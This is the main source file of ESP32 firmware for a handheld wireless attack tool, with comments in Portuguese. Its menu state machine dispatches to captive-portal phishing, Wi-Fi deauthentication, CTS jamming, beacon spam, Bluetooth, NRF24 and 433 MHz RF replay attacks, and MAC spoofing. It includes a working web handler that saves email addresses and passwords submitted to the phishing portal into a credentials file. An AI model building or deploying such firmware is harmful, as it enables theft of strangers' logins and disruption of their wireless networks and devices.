#include "esp_err.h"
#include "esp_wifi.h"
#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <TFT_eSPI.h>
#include <WiFi.h>

// Bibliotecas de RF 433 MHz (necessário aqui para o builder do Arduino IDE
// detectar e compilar os .cpp das bibliotecas — só inclui em Menu_RF.cpp
// não é suficiente para o linker)
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>

// Modules
#include "Attacks.h"
#include "Captive.h"
#include "Config.h"
#include "Globals.h"
#include "Menu_Attacks.h"
#include "Menu_BT.h"
#include "Menu_Config.h"
#include "Menu_Main.h"
#include "Menu_NRF24.h"
#include "Menu_Networks.h"
#include "Menu_RF.h"
#include "Battery.h"
#include "HWProbe.h"
#include "Radio.h"
#include "Scanner.h"
#include "Splash.h"
#include "UI.h"

// ==================== LIMPEZA ====================

void cleanup() {
  Serial.println("Executando limpeza...");

  if (attackTaskRunning) {
    attackTaskRunning = false;
    delay(300);
  }

  if (attackTaskHandle != NULL) {
    vTaskDelete(attackTaskHandle);
    attackTaskHandle = NULL;
  }

  if (wifiMutex != NULL) {
    vSemaphoreDelete(wifiMutex);
    wifiMutex = NULL;
  }

  radioLocked = false;
  canalTravado = 0;

  deautherAtivo = false;
  beaconAtivo = false;
  ctsAtivo = false;

  Serial.println("Limpeza concluída");
}

// ==================== SETUP ====================

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n=== INICIANDO SISTEMA ===");

  // Limpeza forçada do WiFi
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  delay(500);

  cleanup();
  delay(100);

  wifiMutex = xSemaphoreCreateMutex();
  if (wifiMutex == NULL) {
    Serial.println("ERRO CRÍTICO: Falha ao criar mutex!");
    tft.init();
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_RED);
    tft.setCursor(10, 70);
    tft.println("ERRO: MUTEX");
    while (1) {
      delay(1000);
    }
  }
  Serial.println("✓ Mutex criado");

  pinMode(BUTTON_LEFT, INPUT_PULLUP);
  pinMode(BUTTON_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);
  Serial.println("✓ Botões configurados");

  tft.init();
  tft.setRotation(4);
  tft.fillScreen(TFT_BLACK);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  Serial.println("✓ Display configurado");

  // Inicializa leitura de bateria (ADC + primeiro desenho do ícone)
  batteryInit();

  // ── Verificação de bateria crítica no boot ──────────────────
  if (batteryPercent() <= 5) {
    Serial.println("AVISO: Bateria critica! Desligando...");

    tft.fillScreen(TFT_BLACK);

    // ── Triângulo amarelo de aviso ────────────────────────────
    // Triângulo com vértice no topo, base na parte de baixo
    const int TX = 64, TY_TOP = 30, TY_BOT = 100, TW = 50;
    // Triângulo preenchido (3 pontos: topo, baixo-esq, baixo-dir)
    tft.fillTriangle(TX, TY_TOP,      // vértice topo
                     TX - TW, TY_BOT, // baixo esquerda
                     TX + TW, TY_BOT, // baixo direita
                     TFT_YELLOW);
    // Borda preta fina para contraste
    tft.drawTriangle(TX, TY_TOP, TX - TW, TY_BOT, TX + TW, TY_BOT, TFT_BLACK);

    // ── Símbolo "!" dentro do triângulo — tamanho 4, centrado ─
    tft.setTextSize(6);
    tft.setTextColor(TFT_BLACK);
    tft.setCursor(TX - 12, TY_TOP + 22); // centralizado no X e Y do triângulo
    tft.print("!");

    // ── Texto de aviso ────────────────────────────────────────
    tft.setTextSize(1);
    tft.setTextColor(TFT_YELLOW);
    tft.setCursor(18, TY_BOT + 12);
    tft.print("  BATERIA BAIXA");
    tft.setCursor(6, TY_BOT + 26);
    tft.print("Carregue antes de usar");

    // Percentual em vermelho
    tft.setTextSize(2);
    tft.setTextColor(TFT_RED);
    char pctBuf[6];
    snprintf(pctBuf, sizeof(pctBuf), "%d%%", batteryPercent());
    int px = (128 - (int)strlen(pctBuf) * 12) / 2;
    tft.setCursor(px, TY_BOT + 44);
    tft.print(pctBuf);

    // Aguarda 5 segundos (contagem regressiva na tela)
    for (int i = 5; i >= 1; i--) {
      tft.setTextSize(1);
      tft.setTextColor(TFT_DARKGREY);
      tft.fillRect(40, TY_BOT + 64, 50, 10, TFT_BLACK);
      tft.setCursor(32, TY_BOT + 64);
      char cbuf[16];
      snprintf(cbuf, sizeof(cbuf), "Desligando em %d...", i);
      tft.print(cbuf);
      delay(1000);
    }

    // Apaga o display e entra em deep sleep sem fonte de wakeup
    // → equivale a "desligar" o ESP32
    tft.fillScreen(TFT_BLACK); // limpa antes de apagar o backlight
    blOff();                   // apaga o backlight via LEDC (PWM duty=0)
    esp_sleep_disable_wakeup_source(ESP_SLEEP_WAKEUP_ALL);
    esp_deep_sleep_start();
    // Nunca retorna daqui
  }
  // ────────────────────────────────────────────────────────────

  if (!SPIFFS.begin(true)) {
    Serial.println("ERRO: Falha ao montar SPIFFS");
    tft.setTextColor(TFT_RED);
    tft.setCursor(20, 70);
    tft.println("SPIFFS FAIL");
    delay(2000);
  } else {
    Serial.println("✓ SPIFFS montado");
  }

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("email", true) && request->hasParam("senha", true)) {
      String email = request->getParam("email", true)->value();
      String senha = request->getParam("senha", true)->value();

      File file = SPIFFS.open("/credenciais.txt", FILE_APPEND);
      if (file) {
        file.println();
        file.println(" Email: \n  " + email);
        file.println("ㅤ");
        file.println(" Senha: \n  " + senha);
        file.close();
      }
      request->send(200, "text/plain", "Dados recebidos");
    }
  });

  memset(ap_records, 0, sizeof(ap_records));
  memset(&apRecordSelecionado, 0, sizeof(wifi_ap_record_t));

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  Serial.println("✓ WiFi em modo STA");

  // Inicia as preferências salvas e aplica (Brilho, MAC, Modo Menu)
  initConfig();

  systemInitialized = true;

  // Inicializa o CC1101 no boot para aparecer conectado no Menu Config
  // Isso é feito APÓS a tela ter sido configurada para não roubar o barramento SPI
  hwCC1101_ok = rfInit();

  // Exibe splash screen com a imagem do SPIFFS
  displaySplash(2500); // 2,5 segundos

  displayMenuInicial();
  Serial.println("=== SISTEMA PRONTO ===\n");
}

// ==================== LOOP ====================

void loop() {
  if (!systemInitialized) {
    delay(100);
    return;
  }

  switch (estadoAtual) {
  case MENU_INICIAL:
    handleMenuInicial();
    break;

  case SELECAO_REDES:
    handleSelecaoRedes();
    break;

  case MENU_ATAQUES:
    handleMenuAtaques();
    break;

  case ATAQUE_CAPTIVE_PORTAL:
    handleAtaqueCaptivePortal();
    break;

  case ATAQUE_DEAUTHER:
    handleAtaqueDeauther();
    break;

  case ATAQUE_DEAUTHER_SCAN:
    handleAtaqueDeautherScan();
    break;

  case ATAQUE_CTS_JAMMER:
    handleAtaqueCtsJammer();
    break;

  case ATAQUE_BEACON_MODO:
    handleAtaqueBeaconModo();
    break;

  case ATAQUE_BEACON_CUSTOM:
    handleAtaqueBeaconCustom();
    break;

  case ATAQUE_BEACON:
    handleAtaqueBeacon();
    break;

  case VISUALIZAR_CREDENCIAIS:
    handleVisualizarCredenciais();
    break;

  case MODO_BLUETOOTH:
    handleMenuBT();
    break;

  case TELA_BT_SUBMENU:
    handleBT_SubMenu();
    break;

  case TELA_BT_SCAN:
    handleBT_Scan();
    break;

  case TELA_BT_ATTACK:
    handleBT_Attack();
    break;

  case MENU_CONFIGURACOES:
    handleConfiguracoes();
    break;

  case TELA_ARMAZENAMENTO:
    handleArmazenamento();
    break;

  case TELA_SOBRE:
    handleSobre();
    break;

  case TELA_MAC_CHANGER:
    handleMudarMAC();
    break;

  case TELA_BRILHO:
    handleBrilho();
    break;

  case TELA_MODO_MENU:
    handleModoMenu();
    break;

  case TELA_SCREENSAVER:
    handleScreensaver();
    break;

  case MENU_RF:
    handleRF();
    break;

  case TELA_RF_REPLAY:
    handleRF_Replay();
    break;

  case TELA_RF_RAW:
    handleRF_Raw();
    break;

  case TELA_RF_ANALYSER:
    handleRF_Analyser();
    break;

  case TELA_RF_RANDOM:
    handleRF_Random();
    break;

  case TELA_RF_SAVED:
    handleRF_Saved();
    break;

  case CONFIRMA_APAGAR_CREDENCIAIS:
    handleConfirmaApagar();
    break;

  case MENU_NRF24:
  case TELA_NRF_ATTACK:
    handleModoNRF24();
    break;

  case TELA_DESLIGAR:
    handleDesligar();
    break;

  case TELA_SCREENSAVER_TEST:
    handleScreensaverTest();
    break;
  }

  // Atualiza ícone de bateria (só redesenha se passou 1 min e mudou >= 5%)
  batteryUpdate();

  // Verificação de bateria crítica durante uso normal
  if (batteryPercent() <= 5) {
    Serial.println("[BAT] CRITICA durante uso! Iniciando desligamento...");

    tft.fillScreen(TFT_BLACK);

    const int TX = 64, TY_TOP = 30, TY_BOT = 100, TW = 50;
    tft.fillTriangle(TX, TY_TOP, TX - TW, TY_BOT, TX + TW, TY_BOT, TFT_YELLOW);
    tft.drawTriangle(TX, TY_TOP, TX - TW, TY_BOT, TX + TW, TY_BOT, TFT_BLACK);
    tft.setTextSize(4);
    tft.setTextColor(TFT_BLACK);
    tft.setCursor(TX - 12, TY_TOP + 22); // centralizado no X e Y do triângulo
    tft.print("!");
    tft.setTextSize(1);
    tft.setTextColor(TFT_YELLOW);
    tft.setCursor(18, TY_BOT + 12);
    tft.print("  BATERIA BAIXA");
    tft.setCursor(6, TY_BOT + 26);
    tft.print("Carregue antes de usar");
    tft.setTextSize(2);
    tft.setTextColor(TFT_RED);
    char pctBuf[6];
    snprintf(pctBuf, sizeof(pctBuf), "%d%%", batteryPercent());
    int px = (128 - (int)strlen(pctBuf) * 12) / 2;
    tft.setCursor(px, TY_BOT + 44);
    tft.print(pctBuf);

    for (int i = 5; i >= 1; i--) {
      tft.setTextSize(1);
      tft.setTextColor(TFT_DARKGREY);
      tft.fillRect(40, TY_BOT + 64, 50, 10, TFT_BLACK);
      tft.setCursor(32, TY_BOT + 64);
      char cbuf[16];
      snprintf(cbuf, sizeof(cbuf), "Desligando em %d...", i);
      tft.print(cbuf);
      delay(1000);
    }

    tft.fillScreen(TFT_BLACK); // limpa antes de apagar o backlight
    blOff();                   // apaga o backlight via LEDC (PWM duty=0)
    esp_sleep_disable_wakeup_source(ESP_SLEEP_WAKEUP_ALL);
    esp_deep_sleep_start();
  }

  delay(10);
}
